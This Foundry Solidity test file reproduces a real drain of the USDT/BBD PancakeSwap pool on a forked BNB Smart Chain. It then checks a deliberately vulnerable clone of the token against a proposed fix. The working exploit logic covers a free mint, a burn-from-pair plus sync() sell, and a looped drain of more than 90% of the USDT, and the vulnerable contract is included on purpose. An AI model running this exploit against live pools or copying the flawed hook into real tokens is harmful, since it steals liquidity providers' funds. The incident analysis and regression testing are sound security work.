// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import "forge-std/Test.sol";

// ============================================================================
// BigBull Decentralized (BBD) — "burn-from-pair + sync()" LP drain PoC
// ----------------------------------------------------------------------------
// Target  : PancakePair USDT/BBD 0x9b23887aDAeFFbc40F189Cd8Eb97bDBE262e9Af3 (BSC)
// Token   : BBD 0x5D52253f42663fe2a12e1775c64DF700BB6f3df9
// Root bug: BBD._update() (OZ v5 ERC20 transfer hook) calls _burnForSale() on a
//           sell. _burnForSale _burn()s up to 50% of the PAIR's OWN BBD balance
//           and then calls pair.sync(). That resets the Uniswap-V2 K baseline to
//           a lower value, so a sell extracts far more USDT than the constant
//           product curve should allow -> the pool's USDT (LP funds) is drained.
//
// Part A  : forks the REAL contracts at the pre-incident block and drains them.
// Part B  : A/B regression — a minimal clone of the bug vs the proposed fix
//           (sell fee burned from the SENDER, never touching pair reserves / sync).
//
// Run:
//   export BSC_RPC_URL=<bsc archive rpc>     # or BSC_URL / RPC_URL
//   forge test --match-path tests/BBDBurnSync.t.sol -vv
// ============================================================================

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function transfer(address, uint256) external returns (bool);
    function approve(address, uint256) external returns (bool);
    function totalSupply() external view returns (uint256);
}

interface IBBD {
    function mint(address, uint256) external; // only callable by investContract
    function investContract() external view returns (address);
    function sellBurnBps() external view returns (uint16);
    function burnExempt(address) external view returns (bool);
}

interface IPair {
    function getReserves() external view returns (uint112, uint112, uint32);
    function token0() external view returns (address);
    function token1() external view returns (address);
    function swap(uint256, uint256, address, bytes calldata) external;
    function mint(address) external returns (uint256);
    function sync() external;
}

interface IFactory {
    function createPair(address, address) external returns (address);
}

library AmmMath {
    // PancakeSwap V2 fee = 0.25%  ->  9975 / 10000
    function getAmountOut(uint256 amountIn, uint256 reserveIn, uint256 reserveOut)
        internal
        pure
        returns (uint256)
    {
        uint256 inWithFee = amountIn * 9975;
        return (inWithFee * reserveOut) / (reserveIn * 10000 + inWithFee);
    }
}

// ============================================================================
// PART A — reproduce the real drain on a mainnet fork
// ============================================================================
contract BBDBurnSyncExploitTest is Test {
    address constant PAIR = 0x9b23887aDAeFFbc40F189Cd8Eb97bDBE262e9Af3;
    address constant BBD = 0x5D52253f42663fe2a12e1775c64DF700BB6f3df9;
    address constant USDT = 0x55d398326f99059fF775485246999027B3197955;
    address constant INVEST = 0x9C6B1c9E4329d89E5393eC2dadC98a088C91BA7F; // investContract (can mint)

    uint256 constant FORK_BLOCK = 124359389; // pre-incident snapshot

    address attacker = makeAddr("attacker");

    function setUp() public {
        string memory rpc =
            vm.envOr("BSC_RPC_URL", vm.envOr("BSC_URL", vm.envOr("RPC_URL", string(""))));
        require(bytes(rpc).length != 0, "set BSC_RPC_URL / BSC_URL / RPC_URL to a BSC archive RPC");
        vm.createSelectFork(rpc, FORK_BLOCK);

        vm.label(PAIR, "USDT/BBD Pair");
        vm.label(BBD, "BBD");
        vm.label(USDT, "USDT");
        vm.label(INVEST, "investContract");
        vm.label(attacker, "attacker");
    }

    // token0 == USDT for this pair (0x55d3.. < 0x5d52..) -> (usdtReserve, bbdReserve)
    function _reserves() internal view returns (uint256 usdtR, uint256 bbdR) {
        (uint112 r0, uint112 r1,) = IPair(PAIR).getReserves();
        usdtR = uint256(r0);
        bbdR = uint256(r1);
    }

    // Sell `v` BBD into the live pair and return USDT received.
    // The BBD transfer itself fires _burnForSale (burn pool BBD + sync); we then
    // take out the maximum USDT the (now-lowered) K allows via a direct swap.
    function _sell(uint256 v) internal returns (uint256 usdtOut) {
        uint256 before = IERC20(USDT).balanceOf(attacker);
        vm.startPrank(attacker);
        IERC20(BBD).transfer(PAIR, v); // -> _burnForSale(): _burn(pair,..) + sync()
        (uint256 usdtR, uint256 bbdR) = _reserves(); // reserves AFTER sync
        uint256 bbdIn = IERC20(BBD).balanceOf(PAIR) - bbdR; // pending input (== v)
        uint256 out = AmmMath.getAmountOut(bbdIn, bbdR, usdtR);
        IPair(PAIR).swap(out, 0, attacker, ""); // amount0Out = USDT (token0 == USDT)
        vm.stopPrank();
        usdtOut = IERC20(USDT).balanceOf(attacker) - before;
    }

    function test_prestate() public view {
        (uint256 usdtR, uint256 bbdR) = _reserves();
        assertApproxEqAbs(usdtR, 72_326 ether, 5 ether, "USDT reserve prestate");
        assertApproxEqAbs(bbdR, 47_540 ether, 5 ether, "BBD reserve prestate");
        assertEq(IBBD(BBD).sellBurnBps(), 5000, "sellBurnBps == 50%");
        assertEq(IBBD(BBD).investContract(), INVEST, "investContract set");
        assertFalse(IBBD(BBD).burnExempt(attacker), "attacker not burn-exempt");
    }

    // The core defect, isolated: one sell beats the fair constant-product price.
    function test_sell_beats_fair_constant_product_price() public {
        (uint256 usdtR0, uint256 bbdR0) = _reserves();
        uint256 v = bbdR0; // sell an amount equal to the pool's BBD reserve

        // What a NORMAL (non-malicious) token sell of `v` would yield:
        uint256 fairOut = AmmMath.getAmountOut(v, bbdR0, usdtR0);

        // Arm the attacker with free BBD via the uncapped investContract mint.
        vm.prank(INVEST);
        IBBD(BBD).mint(attacker, v);

        uint256 actualOut = _sell(v);

        emit log_named_decimal_uint("fair USDT out  ", fairOut, 18);
        emit log_named_decimal_uint("actual USDT out", actualOut, 18);
        assertGt(actualOut, fairOut, "burn+sync must let the seller beat the AMM curve");
    }

    // Full economic impact: drain the pool's USDT to ~0 with free-minted BBD.
    function test_reproduce_pool_usdt_drain() public {
        (uint256 usdtR0,) = _reserves();
        emit log_named_decimal_uint("USDT in pool (start)", usdtR0, 18);

        for (uint256 i = 0; i < 25; i++) {
            (uint256 usdtR, uint256 bbdR) = _reserves();
            if (usdtR < 1 ether) break;
            uint256 v = bbdR; // ~one pool's worth per round
            if (IERC20(BBD).balanceOf(attacker) < v) {
                vm.prank(INVEST);
                IBBD(BBD).mint(attacker, v);
            }
            _sell(v);
        }

        (uint256 usdtRf,) = _reserves();
        uint256 loot = IERC20(USDT).balanceOf(attacker);
        emit log_named_decimal_uint("USDT in pool (end)  ", usdtRf, 18);
        emit log_named_decimal_uint("attacker USDT loot  ", loot, 18);

        assertLt(usdtRf, usdtR0 / 100, "pool USDT must be drained below 1% of start");
        assertGt(loot, (usdtR0 * 90) / 100, "attacker must capture >90% of pool USDT");
    }
}

// ============================================================================
// PART B — A/B regression: vulnerable clone vs fixed token
// ============================================================================
contract MiniERC20 {
    string public name;
    string public symbol;
    uint8 public constant decimals = 18;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);

    constructor(string memory n, string memory s) {
        name = n;
        symbol = s;
    }

    function approve(address sp, uint256 v) external returns (bool) {
        allowance[msg.sender][sp] = v;
        emit Approval(msg.sender, sp, v);
        return true;
    }

    function transfer(address to, uint256 v) external returns (bool) {
        _transfer(msg.sender, to, v);
        return true;
    }

    function transferFrom(address f, address to, uint256 v) external returns (bool) {
        uint256 a = allowance[f][msg.sender];
        if (a != type(uint256).max) allowance[f][msg.sender] = a - v;
        _transfer(f, to, v);
        return true;
    }

    function _mint(address to, uint256 v) internal {
        totalSupply += v;
        balanceOf[to] += v;
        emit Transfer(address(0), to, v);
    }

    function _burn(address f, uint256 v) internal {
        balanceOf[f] -= v;
        totalSupply -= v;
        emit Transfer(f, address(0), v);
    }

    function _rawTransfer(address f, address to, uint256 v) internal {
        balanceOf[f] -= v;
        balanceOf[to] += v;
        emit Transfer(f, to, v);
    }

    function _transfer(address f, address to, uint256 v) internal virtual {
        _rawTransfer(f, to, v);
    }
}

abstract contract BBDLike is MiniERC20 {
    address public dexPair;
    address public immutable quoteToken;
    bool internal immutable quoteIsToken1;
    uint16 public constant sellBurnBps = 5000; // 50%

    constructor(address _quote) {
        quoteToken = _quote;
        quoteIsToken1 = address(this) < _quote;
        _mint(msg.sender, 1_000_000_000 ether);
    }

    function setPair(address p) external {
        require(dexPair == address(0), "pair set");
        dexPair = p;
    }

    function _isSell() internal view returns (bool) {
        (uint112 r0, uint112 r1,) = IPair(dexPair).getReserves();
        uint256 quoteReserve = quoteIsToken1 ? uint256(r1) : uint256(r0);
        return IERC20(quoteToken).balanceOf(dexPair) <= quoteReserve;
    }
}

// Faithful reproduction of the deployed bug.
contract BBDVuln is BBDLike {
    constructor(address q) MiniERC20("BBDVuln", "VULN") BBDLike(q) {}

    function _transfer(address f, address to, uint256 v) internal override {
        if (to == dexPair && f != address(0) && _isSell()) {
            uint256 amount = (v * sellBurnBps) / 10_000;
            uint256 cap = balanceOf[dexPair] / 2;
            if (amount > cap) amount = cap;
            if (amount > 0) {
                _burn(dexPair, amount); // (!) burns the PAIR's own reserve
                IPair(dexPair).sync(); // (!) commits the lowered K baseline
            }
        }
        _rawTransfer(f, to, v);
    }
}

// Proposed fix: the sell fee is burned from the SELLER's amount; the pair's
// reserves are never touched and sync() is never called from the hook.
contract BBDFixed is BBDLike {
    constructor(address q) MiniERC20("BBDFixed", "FIX") BBDLike(q) {}

    function _transfer(address f, address to, uint256 v) internal override {
        if (to == dexPair && f != address(0) && _isSell()) {
            uint256 fee = (v * sellBurnBps) / 10_000;
            if (fee > 0) {
                _burn(f, fee); // burn from the seller
                v -= fee; // the pair simply receives less
            }
        }
        _rawTransfer(f, to, v);
    }
}

contract BBDFixRegressionTest is Test {
    address constant USDT = 0x55d398326f99059fF775485246999027B3197955;
    address constant FACTORY = 0xcA143Ce32Fe78f1f7019d7d551a6402fC5350c73; // PancakeV2 Factory

    uint256 constant FORK_BLOCK = 124359389;
    uint256 constant USDT_SEED = 72_326 ether;
    uint256 constant BBD_SEED = 47_540 ether;

    function setUp() public {
        string memory rpc =
            vm.envOr("BSC_RPC_URL", vm.envOr("BSC_URL", vm.envOr("RPC_URL", string(""))));
        require(bytes(rpc).length != 0, "set BSC_RPC_URL / BSC_URL / RPC_URL to a BSC archive RPC");
        vm.createSelectFork(rpc, FORK_BLOCK);
    }

    function _deployAndSeed(bool wantFixed) internal returns (address token, address pair) {
        token = wantFixed ? address(new BBDFixed(USDT)) : address(new BBDVuln(USDT));
        pair = IFactory(FACTORY).createPair(token, USDT);
        BBDLike(token).setPair(pair);

        deal(USDT, address(this), USDT_SEED);
        IERC20(USDT).transfer(pair, USDT_SEED); // quote first -> BBD transfer is not seen as a sell
        MiniERC20(token).transfer(pair, BBD_SEED);
        IPair(pair).mint(address(this)); // seed LP
    }

    function _poolReserves(address token, address pair)
        internal
        view
        returns (uint256 tokenReserve, uint256 usdtReserve)
    {
        (uint112 r0, uint112 r1,) = IPair(pair).getReserves();
        if (IPair(pair).token0() == token) return (uint256(r0), uint256(r1));
        return (uint256(r1), uint256(r0));
    }

    // Sell `v` token into `pair` via a direct swap; return USDT received.
    function _sell(address token, address pair, uint256 v) internal returns (uint256 usdtOut) {
        uint256 before = IERC20(USDT).balanceOf(address(this));
        MiniERC20(token).transfer(pair, v); // fires the token hook
        (uint256 tokenReserve, uint256 usdtReserve) = _poolReserves(token, pair);
        uint256 tokenIn = IERC20(token).balanceOf(pair) - tokenReserve;
        uint256 out = AmmMath.getAmountOut(tokenIn, tokenReserve, usdtReserve);
        if (IPair(pair).token0() == USDT) {
            IPair(pair).swap(out, 0, address(this), "");
        } else {
            IPair(pair).swap(0, out, address(this), "");
        }
        usdtOut = IERC20(USDT).balanceOf(address(this)) - before;
    }

    // Control: the cloned bug reproduces the extraction in a sandbox.
    function test_regression_vuln_allows_extraction() public {
        (address token, address pair) = _deployAndSeed(false);
        (uint256 tokenReserve, uint256 usdtReserve) = _poolReserves(token, pair);
        uint256 v = tokenReserve;
        uint256 fairOut = AmmMath.getAmountOut(v, tokenReserve, usdtReserve);
        uint256 actualOut = _sell(token, pair, v);
        emit log_named_decimal_uint("[vuln]  fair USDT out  ", fairOut, 18);
        emit log_named_decimal_uint("[vuln]  actual USDT out", actualOut, 18);
        assertGt(actualOut, fairOut, "vuln clone should beat the fair price");
    }

    // Fix: the same sell can never exceed the fair constant-product price.
    function test_regression_fixed_blocks_extraction() public {
        (address token, address pair) = _deployAndSeed(true);
        (uint256 tokenReserve, uint256 usdtReserve) = _poolReserves(token, pair);
        uint256 v = tokenReserve;
        uint256 fairOut = AmmMath.getAmountOut(v, tokenReserve, usdtReserve);
        uint256 actualOut = _sell(token, pair, v);
        emit log_named_decimal_uint("[fixed] fair USDT out  ", fairOut, 18);
        emit log_named_decimal_uint("[fixed] actual USDT out", actualOut, 18);
        assertLe(actualOut, fairOut, "fixed token must NOT exceed the fair price");
        assertGt(actualOut, 0, "a normal sell must still succeed");
    }
}
